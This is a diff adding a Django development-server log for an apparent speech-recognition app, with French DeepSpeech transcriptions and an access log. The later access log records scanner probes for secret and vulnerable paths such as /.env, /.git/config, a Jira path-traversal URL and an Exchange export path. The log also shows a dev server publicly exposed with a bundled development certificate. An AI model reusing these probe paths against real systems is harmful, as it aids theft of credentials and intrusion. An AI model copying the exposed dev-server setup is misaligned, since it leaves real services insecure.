@@ -1,0 +1,2890 @@
+/var/www/ai_speech/venv/lib/python3.7/site-packages/pydub/utils.py:170: RuntimeWarning: Couldn't find ffmpeg or avconv - defaulting to ffmpeg, but may not work
+  warn("Couldn't find ffmpeg or avconv - defaulting to ffmpeg, but may not work", RuntimeWarning)
+Watching for file changes with StatReloader
+System check identified some issues:
+
+WARNINGS:
+stt_app.voice: (models.W042) Auto-created primary key used when not defining a primary key type, by default 'django.db.models.AutoField'.
+	HINT: Configure the DEFAULT_AUTO_FIELD setting or the SttAppConfig.default_auto_field attribute to point to a subclass of AutoField, e.g. 'django.db.models.BigAutoField'.
+
+System check identified 1 issue (0 silenced).
+/var/www/ai_speech/venv/lib/python3.7/site-packages/pydub/utils.py:170: RuntimeWarning: Couldn't find ffmpeg or avconv - defaulting to ffmpeg, but may not work
+  warn("Couldn't find ffmpeg or avconv - defaulting to ffmpeg, but may not work", RuntimeWarning)
+/var/www/ai_speech/venv/lib/python3.7/site-packages/pydub/utils.py:170: RuntimeWarning: Couldn't find ffmpeg or avconv - defaulting to ffmpeg, but may not work
+  warn("Couldn't find ffmpeg or avconv - defaulting to ffmpeg, but may not work", RuntimeWarning)
+Watching for file changes with StatReloader
+System check identified some issues:
+
+WARNINGS:
+stt_app.voice: (models.W042) Auto-created primary key used when not defining a primary key type, by default 'django.db.models.AutoField'.
+	HINT: Configure the DEFAULT_AUTO_FIELD setting or the SttAppConfig.default_auto_field attribute to point to a subclass of AutoField, e.g. 'django.db.models.BigAutoField'.
+
+System check identified 1 issue (0 silenced).
+Not Found: /
+[05/Feb/2024 13:40:33] "GET / HTTP/1.0" 404 2169
+[05/Feb/2024 13:40:37] "GET /stt/test-mic-speech/ HTTP/1.0" 200 1415
+Not Found: /
+[05/Feb/2024 13:40:50] "GET / HTTP/1.0" 404 2169
+[05/Feb/2024 13:41:05] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 37
+[05/Feb/2024 13:41:25] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 74
+[05/Feb/2024 13:41:49] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 89
+[05/Feb/2024 13:42:13] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 70
+[05/Feb/2024 13:43:31] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 41
+[05/Feb/2024 13:43:47] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 71
+Validating models...
+
+February 05, 2024 - 13:40:27
+Django version 3.2.23, using settings 'ai_speech.settings'
+Starting development server at https://0.0.0.0:8001/
+Using SSL certificate: /var/www/ai_speech/venv/lib/python3.7/site-packages/sslserver/certs/development.crt
+Using SSL key: /var/www/ai_speech/venv/lib/python3.7/site-packages/sslserver/certs/development.key
+Quit the server with CONTROL-C.
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmp_i0_vp1r.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmp_i0_vp1r.wav']
+Okunan: il doit 
+
+22.22
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpde9kxb91.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpde9kxb91.wav']
+Okunan: non ma maison et le colonel très sous
+
+58.7
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmp2cvaxe_3.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmp2cvaxe_3.wav']
+Okunan: dans moi mes hommes il y a une coloré son ressemble
+
+66.04
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpo0h1tfss.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpo0h1tfss.wav']
+Okunan: dom maison il y a un colorisme tresor
+
+71.74
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmp3f4bwz60.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmp3f4bwz60.wav']
+Okunan: se promenant
+
+22.86
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmp8w2u46px.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmp8w2u46px.wav']
+Okunan: robot de romani y a une pour son essor
+
+58.33
+/var/www/ai_speech/venv/lib/python3.7/site-packages/pydub/utils.py:170: RuntimeWarning: Couldn't find ffmpeg or avconv - defaulting to ffmpeg, but may not work
+  warn("Couldn't find ffmpeg or avconv - defaulting to ffmpeg, but may not work", RuntimeWarning)
+/var/www/ai_speech/venv/lib/python3.7/site-packages/pydub/utils.py:170: RuntimeWarning: Couldn't find ffmpeg or avconv - defaulting to ffmpeg, but may not work
+  warn("Couldn't find ffmpeg or avconv - defaulting to ffmpeg, but may not work", RuntimeWarning)
+Watching for file changes with StatReloader
+System check identified some issues:
+
+WARNINGS:
+stt_app.voice: (models.W042) Auto-created primary key used when not defining a primary key type, by default 'django.db.models.AutoField'.
+	HINT: Configure the DEFAULT_AUTO_FIELD setting or the SttAppConfig.default_auto_field attribute to point to a subclass of AutoField, e.g. 'django.db.models.BigAutoField'.
+
+System check identified 1 issue (0 silenced).
+[05/Feb/2024 13:46:09] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 76
+[05/Feb/2024 13:46:25] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 72
+[05/Feb/2024 13:46:53] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 36
+[05/Feb/2024 13:47:43] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 29
+[05/Feb/2024 13:48:02] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 29
+[05/Feb/2024 13:48:22] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 82
+[05/Feb/2024 13:48:51] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 93
+[05/Feb/2024 13:49:12] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 98
+[05/Feb/2024 13:49:31] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 75
+[05/Feb/2024 13:49:48] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 82
+[05/Feb/2024 13:50:05] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 86
+[05/Feb/2024 13:50:35] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 67
+[05/Feb/2024 13:50:38] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 29
+[05/Feb/2024 13:50:41] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 29
+[05/Feb/2024 13:50:59] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 74
+[05/Feb/2024 13:51:47] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 58
+[05/Feb/2024 13:52:44] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 46
+Not Found: /
+[05/Feb/2024 13:54:36] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[05/Feb/2024 13:58:45] "GET / HTTP/1.0" 404 2167
+Not Found: /portal/redlion
+[05/Feb/2024 14:01:08] "GET /portal/redlion HTTP/1.0" 404 2227
+Not Found: /
+[05/Feb/2024 14:12:36] "OPTIONS / HTTP/1.0" 404 2171
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Feb/2024 14:17:13] "GET / HTTP/1.0" 400 65968
+Not Found: /
+[05/Feb/2024 14:26:42] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[05/Feb/2024 14:46:29] "GET / HTTP/1.0" 404 2167
+[05/Feb/2024 14:48:37] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 76
+Not Found: /
+[05/Feb/2024 15:03:43] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 2200
+Not Found: /
+[05/Feb/2024 15:25:47] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[05/Feb/2024 15:31:12] "GET / HTTP/1.0" 404 2167
+[05/Feb/2024 15:40:19] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 29
+[05/Feb/2024 15:40:19] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 29
+[05/Feb/2024 15:40:40] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 62
+[05/Feb/2024 15:40:56] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 48
+[05/Feb/2024 15:41:12] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 62
+[05/Feb/2024 15:42:10] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 57
+Validating models...
+
+February 05, 2024 - 13:45:54
+Django version 3.2.23, using settings 'ai_speech.settings'
+Starting development server at https://0.0.0.0:8001/
+Using SSL certificate: /var/www/ai_speech/venv/lib/python3.7/site-packages/sslserver/certs/development.crt
+Using SSL key: /var/www/ai_speech/venv/lib/python3.7/site-packages/sslserver/certs/development.key
+Quit the server with CONTROL-C.
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpb5s2ubg0.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpb5s2ubg0.wav']
+Okunan: comme maison il y a a coloré son tasso
+
+64.52
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmphu6dgh68.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmphu6dgh68.wav']
+Okunan: non ma maison il y a encore
+
+58.54
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpdl26olh2.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpdl26olh2.wav']
+Okunan: la mise
+
+19.35
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpj38u666w.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpj38u666w.wav']
+Okunan: 
+
+0.0
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmphu4vzcm5.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmphu4vzcm5.wav']
+Okunan: 
+
+0.0
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpfwooh7bi.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpfwooh7bi.wav']
+Okunan: dans la maison il y a un couloir siège presse
+
+74.0
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpa5rgxn59.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpa5rgxn59.wav']
+Okunan: au bout des couleurs il y a une porte semble très semble
+
+80.7
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmp6_m8ndph.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmp6_m8ndph.wav']
+Okunan: derrière de la porte il y a une chambre sans très simple
+
+80.0
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmphu9rz7dy.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmphu9rz7dy.wav']
+Okunan: dommage il y a un oeil chambre tres sainte
+
+53.19
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmp6mnc3xou.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmp6mnc3xou.wav']
+Okunan: dans la chambre il y a un lit sans le treize cent
+
+69.31
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmprmknznke.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmprmknznke.wav']
+Okunan: dans la chambre il y a un lit semble très sombre
+
+90.0
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmp02d0ca_6.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmp02d0ca_6.wav']
+Okunan: ils deconvenue de ce capote senneterre
+
+29.21
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpi1913k81.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpi1913k81.wav']
+Okunan: 
+
+0.0
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpr4ogxw_v.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpr4ogxw_v.wav']
+Okunan: 
+
+0.0
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpa5_yoejy.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpa5_yoejy.wav']
+Okunan: sous le lit il y a une voix sombre semble
+
+76.09
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpp1zmzarz.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpp1zmzarz.wav']
+Okunan: et on la boîte il y a
+
+76.0
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpk8juzc11.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpk8juzc11.wav']
+Okunan: non ma maison
+
+32.35
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpw9erz3zf.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpw9erz3zf.wav']
+Okunan: la maman il y a la peur comme très son
+
+58.06
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpqkl6x12y.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpqkl6x12y.wav']
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpuowzlh17.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpuowzlh17.wav']
+Okunan: 
+
+0.0
+Okunan: 
+
+0.0
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpc6zao565.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpc6zao565.wav']
+Okunan: dans les annales très sur
+
+45.0
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpc7i8rstm.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpc7i8rstm.wav']
+Okunan: dans pareil a t 
+
+33.8
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpflbyhzd4.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpflbyhzd4.wav']
+Okunan: dans les sonates
+
+30.99
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpr6gmgjax.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpr6gmgjax.wav']
+Okunan: marie ontario la promesse
+
+40.0
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpp8toqyh4.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpp8toqyh4.wav'][05/Feb/2024 15:42:32] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 51
+[05/Feb/2024 15:42:59] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 53
+Not Found: /
+[05/Feb/2024 15:53:36] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[05/Feb/2024 16:00:07] "GET / HTTP/1.0" 404 2170
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Feb/2024 16:10:10] "GET / HTTP/1.0" 400 65719
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Feb/2024 16:11:20] "GET / HTTP/1.0" 400 65719
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Feb/2024 16:17:24] "GET / HTTP/1.0" 400 65719
+Not Found: /actuator/gateway/routes
+[05/Feb/2024 17:08:37] "GET /actuator/gateway/routes HTTP/1.0" 404 2257
+Invalid HTTP_HOST header: 'www'. You may need to add 'www' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Feb/2024 17:16:28] "GET / HTTP/1.1" 400 64107
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Feb/2024 17:36:32] "GET / HTTP/1.0" 400 65719
+Not Found: /
+[05/Feb/2024 18:00:52] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[05/Feb/2024 18:36:49] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[05/Feb/2024 18:57:15] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[05/Feb/2024 19:06:09] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[05/Feb/2024 19:06:13] "GET / HTTP/1.0" 404 2167
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Feb/2024 19:16:18] "GET / HTTP/1.0" 400 65471
+Not Found: /
+[05/Feb/2024 20:30:46] "GET / HTTP/1.0" 404 2170
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Feb/2024 20:57:49] "GET / HTTP/1.0" 400 66915
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Feb/2024 20:57:54] "GET / HTTP/1.0" 400 66460
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Feb/2024 20:57:56] "GET / HTTP/1.0" 400 66464
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Feb/2024 20:58:00] "GET / HTTP/1.0" 400 65340
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Feb/2024 20:58:00] "GET / HTTP/1.0" 400 65320
+Bad Request: /
+[05/Feb/2024 20:58:00] "GET / HTTP/1.0" 400 65342
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Feb/2024 20:58:00] "GET / HTTP/1.0" 400 65773
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Feb/2024 20:58:00] "GET / HTTP/1.0" 400 65793
+Bad Request: /
+[05/Feb/2024 20:58:00] "GET / HTTP/1.0" 400 65777
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /.vscode/sftp.json
+[05/Feb/2024 20:58:01] "GET /.vscode/sftp.json HTTP/1.0" 400 65676
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+Bad Request: /about
+[05/Feb/2024 20:58:01] "GET /about HTTP/1.0" 400 65546
+[05/Feb/2024 20:58:01] "GET / HTTP/1.0" 400 65322
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /debug/default/view
+[05/Feb/2024 20:58:01] "GET /debug/default/view?panel=config HTTP/1.0" 400 66071
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /v2/_catalog
+[05/Feb/2024 20:58:01] "GET /v2/_catalog HTTP/1.0" 400 15537
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Feb/2024 20:58:02] "GET / HTTP/1.0" 400 65793
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application
+[05/Feb/2024 20:58:02] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.0" 400 66314
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /.vscode/sftp.json
+[05/Feb/2024 20:58:02] "GET /.vscode/sftp.json HTTP/1.0" 400 65676
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /server-status
+[05/Feb/2024 20:58:02] "GET /server-status HTTP/1.0" 400 65632
+Bad Request: /about
+[05/Feb/2024 20:58:02] "GET /about HTTP/1.0" 400 65546
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /login.action
+[05/Feb/2024 20:58:02] "GET /login.action HTTP/1.0" 400 65621
+Bad Request: /debug/default/view
+[05/Feb/2024 20:58:02] "GET /debug/default/view?panel=config HTTP/1.0" 400 66069
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /_all_dbs
+[05/Feb/2024 20:58:02] "GET /_all_dbs HTTP/1.0" 400 65693
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /.DS_Store
+[05/Feb/2024 20:58:03] "GET /.DS_Store HTTP/1.0" 400 65588
+Bad Request: /v2/_catalog
+[05/Feb/2024 20:58:03] "GET /v2/_catalog HTTP/1.0" 400 15535
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application
+[05/Feb/2024 20:58:03] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.0" 400 66314
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /.env
+[05/Feb/2024 20:58:03] "GET /.env HTTP/1.0" 400 65533
+Bad Request: /server-status
+[05/Feb/2024 20:58:03] "GET /server-status HTTP/1.0" 400 65634
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /login.action
+[05/Feb/2024 20:58:03] "GET /login.action HTTP/1.0" 400 65623
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /.git/config
+[05/Feb/2024 20:58:04] "GET /.git/config HTTP/1.0" 400 65610
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /_all_dbs
+[05/Feb/2024 20:58:04] "GET /_all_dbs HTTP/1.0" 400 65691
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /s/132323e20383e21323e2430313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
+[05/Feb/2024 20:58:04] "GET /s/132323e20383e21323e2430313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.0" 400 66581
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /.DS_Store
+[05/Feb/2024 20:58:04] "GET /.DS_Store HTTP/1.0" 400 65590
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /config.json
+[05/Feb/2024 20:58:04] "GET /config.json HTTP/1.0" 400 65612
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /telescope/requests
+[05/Feb/2024 20:58:04] "GET /telescope/requests HTTP/1.0" 400 65689
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /.env
+[05/Feb/2024 20:58:04] "GET /.env HTTP/1.0" 400 65535
